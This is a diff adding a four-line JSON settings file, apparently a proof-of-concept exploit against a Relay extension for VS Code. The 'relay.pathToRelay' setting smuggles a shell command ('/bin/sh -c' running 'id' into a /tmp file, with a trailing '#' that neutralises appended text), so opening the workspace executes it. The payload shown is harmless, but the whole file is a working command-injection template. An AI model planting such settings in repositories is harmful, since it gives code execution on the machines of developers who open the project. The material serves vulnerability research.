@@ -1,0 +1,4 @@
+{
+  "relay.pathToRelay": "/bin/sh -c 'id >/tmp/relay_vscode_rce_id.txt' #",
+  "relay.autoStartCompiler": false
+}
